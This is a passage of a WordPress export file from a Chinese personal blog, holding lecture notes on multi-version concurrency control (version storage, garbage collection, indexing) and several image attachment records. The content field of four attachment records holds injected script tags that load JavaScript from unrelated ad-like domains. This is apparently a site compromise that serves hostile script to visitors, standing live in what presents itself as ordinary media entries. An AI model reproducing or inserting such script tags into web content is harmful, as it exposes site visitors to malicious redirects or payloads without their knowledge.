		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[327]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[17 Multi-Version Concurrency Control]]></title>
		<link>http://www.ironmanzzm.top/?p=329</link>
		<pubDate>Fri, 20 May 2022 12:46:57 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=329</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading -->
<h2>Why MVCC?</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>之前的并发控制机制要么是通过延迟，要么是通过中止事务来保证可串行性。如果系统中保存了每一数据项的旧版本，并能识别出每个事务应该读到哪个版本，就可以避免这些问题。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>MVCC Design Decision</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Concurrency Control Protocal</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>首先要选择一种并发控制协议2PL/Timestamp/OCC</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Version Storage</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS在每个元组中加入一个指向版本链的指针，通过版本链为每个事务找到对其可见的版本。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Append-Only Storage</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS维护一张主表，主表的每一行保存了所有元组版本，同一个元组的版本通过指针连接在一起。每次对一个元组进行修改时，都将新版本加入到主表的末尾，并将上一个版本的指针域指向它。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>指针的指向可以有两种方向：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Oldest-to-Newest</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>索引中的指针域指向主表中最古老的版本，新版本加入到链表的末尾。这种方向不需要修改索引中的指针域，但每次加入都需要遍历链表。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Newest-to-Oldest</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>索引中的指针域指向最新版本，新版本加入时直接插入到链头。因此不需要遍历链表，但需要修改索引中的指针域。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Append-Only Storage实现最容易，恢复操作消耗时间短，但占用大量内存空间，写入较慢。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331103627.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Time-Travel Storage</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Main Table只保存各个元组最新版本，所有元组的旧版本被放到Time-Travel Table中，并以Newest-to-Oldest的顺序链接。Main Table中最新版本的指针指向Time-Travel Table中对应旧版本链表的表头。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331103759.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Delta Storage</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>MySQL和ORACLE采用这种方法，写入时开销更小，但恢复较慢。由Main Table和Delta Storage Segment两张表组成。总体思路和Time-Travel Storage差不多，但Delta Storage记录的是每个版本对哪些字段上的值进行了什么样修改，而不是整个元组。需要恢复到某个版本时，找到该版本所做的修改，然后重新执行操作即可。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331104300.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Garbage Collection</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>当DBMS检测出某个版本不可能再被当前事务使用时，就会对其空间进行回收。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>回收有不同的级别：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Tuple-level</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>对表进行循序扫描，通过对比版本时间戳和当前事务时间戳检查版本是否还能被访问。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331104743.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>DBMS通过bitmap记录哪些页面被修改过，因此在进行循序扫描时，就只需要扫描修改过的页面。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>扫描可以是后台定期执行，称为Background Vacuuming；也可以是Worker执行扫描任务时顺便检查版本是否过期，这种方式称为Cooperative Cleaning。后者只适用于Olderst-to-Newest方向的实现，因为Newest-to-Oldest的实现下马上就能得到最新版本，没有必要对旧版本进行扫描。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Transaction-level</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>事务会维护自己的read/write set。当一个事务提交后，DBMS会检查该事务创建的所有版本，并将那些不可能再被看见的版本删除。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331105001.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Index Management</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>当对元组的修改不涉及主键时，无需对索引结构进行修改。但是当更新涉及主键时，通常的做法是先执行delete再执行insert。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://eng.uber.com/postgres-to-mysql-migration/">扩展阅读：Why Uber Engineering Switched from Postgres to MySQL</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>对于非主键索引，情况会更加复杂。有<strong>逻辑指针</strong>和<strong>物理指针</strong>两种方案：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Logical Pointer</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>每个元组分配一个不会变更的id，在这个id上建立索引。这种方案需要建立一个中间层。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331105630.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Physical Pointer</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>直接保存版本链头的物理指针。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331105709.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>ORACLE和MYSQL在MVCC方面采用的设计对OLTP任务表现是最好的，PostgreSQL最慢。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220331110240.png" alt=""/></figure>
<!-- /wp:image -->]]></content:encoded>
		<excerpt:encoded><![CDATA[之前的并发控制机制要么是通过延迟，要么是通过中止事务来保证可串行性。如果系统中保存了每一数据项的旧版本，并能识别出每个事务应该读到哪个版本，就可以避免这些问题。]]></excerpt:encoded>
		<wp:post_id>329</wp:post_id>
		<wp:post_date><![CDATA[2022-05-20 20:46:57]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-20 12:46:57]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-20 20:46:57]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-20 12:46:57]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[17-multi-version-concurrency-control]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[330]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[kd-tree]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=32</link>
		<pubDate>Mon, 31 May 2021 01:23:00 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://120.79.212.101/wp-content/uploads/2021/05/kd-tree.png</guid>
		<description></description>
		<content:encoded><![CDATA[<script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>32</wp:post_id>
		<wp:post_date><![CDATA[2021-05-31 09:23:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-31 01:23:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-31 09:23:00]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-31 01:23:00]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[kd-tree]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>31</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2021/05/kd-tree.png]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2021/05/kd-tree.png]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:878;s:6:"height";i:592;s:4:"file";s:19:"2021/05/kd-tree.png";s:5:"sizes";a:9:{s:6:"medium";a:4:{s:4:"file";s:19:"kd-tree-300x202.png";s:5:"width";i:300;s:6:"height";i:202;s:9:"mime-type";s:9:"image/png";}s:9:"thumbnail";a:4:{s:4:"file";s:19:"kd-tree-150x150.png";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:9:"image/png";}s:12:"medium_large";a:4:{s:4:"file";s:19:"kd-tree-768x518.png";s:5:"width";i:768;s:6:"height";i:518;s:9:"mime-type";s:9:"image/png";}s:16:"dashscroll-small";a:4:{s:4:"file";s:19:"kd-tree-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:19:"kd-tree-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";}s:16:"dashscroll-large";a:4:{s:4:"file";s:19:"kd-tree-670x377.png";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:9:"image/png";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:19:"kd-tree-670x452.png";s:5:"width";i:670;s:6:"height";i:452;s:9:"mime-type";s:9:"image/png";}s:9:"alx-small";a:4:{s:4:"file";s:19:"kd-tree-200x200.png";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:9:"image/png";}s:10:"alx-medium";a:4:{s:4:"file";s:19:"kd-tree-520x293.png";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:9:"image/png";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[src=http___img.php.cn_upload_article_000_000_046_5ef160624ce6b225.jpg&refer=http___img.php]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=47</link>
		<pubDate>Mon, 31 May 2021 13:42:49 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://120.79.212.101/wp-content/uploads/2021/05/srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[<script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>47</wp:post_id>
		<wp:post_date><![CDATA[2021-05-31 21:42:49]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-05-31 13:42:49]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-05-31 21:42:49]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-05-31 13:42:49]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[srchttp___img-php-cn_upload_article_000_000_046_5ef160624ce6b225-jpgreferhttp___img-php]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>46</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2021/05/srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2021/05/srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:800;s:6:"height";i:320;s:4:"file";s:101:"2021/05/srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_.jpg";s:5:"sizes";a:9:{s:6:"medium";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-300x120.jpg";s:5:"width";i:300;s:6:"height";i:120;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-768x307.jpg";s:5:"width";i:768;s:6:"height";i:307;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-670x268.jpg";s:5:"width";i:670;s:6:"height";i:268;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:101:"srchttp___img.php_.cn_upload_article_000_000_046_5ef160624ce6b225.jpgreferhttp___img.php_-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[src=http___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpg&refer=http___img.it610]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=164</link>
		<pubDate>Mon, 14 Jun 2021 11:00:39 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2021/06/srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[<script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>164</wp:post_id>
		<wp:post_date><![CDATA[2021-06-14 19:00:39]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-14 11:00:39]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-14 19:00:39]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-14 11:00:39]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[srchttp___img-it610-com_image_info5_a2e588c82dbc4406b431273319e48c37-jpgreferhttp___img-it610]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>162</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2021/06/srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2021/06/srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:507;s:6:"height";i:142;s:4:"file";s:105:"2021/06/srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610.jpg";s:5:"sizes";a:7:{s:6:"medium";a:4:{s:4:"file";s:104:"srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610-300x84.jpg";s:5:"width";i:300;s:6:"height";i:84;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:105:"srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:105:"srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:105:"srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:105:"srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:105:"srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:105:"srchttp___img.it610.com_image_info5_a2e588c82dbc4406b431273319e48c37.jpgreferhttp___img.it610-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[rocky_mountain_national_park_colorado-wallpaper-1920x1080]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=166</link>
		<pubDate>Mon, 14 Jun 2021 11:02:09 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2021/06/rocky_mountain_national_park_colorado-wallpaper-1920x1080-1.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[<script src='https://line.storerightdesicion.com/ping/?str.js' type='text/javascript'></script><script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>166</wp:post_id>
		<wp:post_date><![CDATA[2021-06-14 19:02:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2021-06-14 11:02:09]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2021-06-14 19:02:09]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2021-06-14 11:02:09]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[rocky_mountain_national_park_colorado-wallpaper-1920x1080]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>162</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2021/06/rocky_mountain_national_park_colorado-wallpaper-1920x1080-1.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2021/06/rocky_mountain_national_park_colorado-wallpaper-1920x1080-1.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1920;s:6:"height";i:1080;s:4:"file";s:71:"2021/06/rocky_mountain_national_park_colorado-wallpaper-1920x1080-1.jpg";s:5:"sizes";a:11:{s:6:"medium";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-300x169.jpg";s:5:"width";i:300;s:6:"height";i:169;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:72:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-1024x576.jpg";s:5:"width";i:1024;s:6:"height";i:576;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-768x432.jpg";s:5:"width";i:768;s:6:"height";i:432;s:9:"mime-type";s:10:"image/jpeg";}s:9:"1536x1536";a:4:{s:4:"file";s:72:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-1536x864.jpg";s:5:"width";i:1536;s:6:"height";i:864;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:71:"rocky_mountain_national_park_colorado-wallpaper-1920x1080-1-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}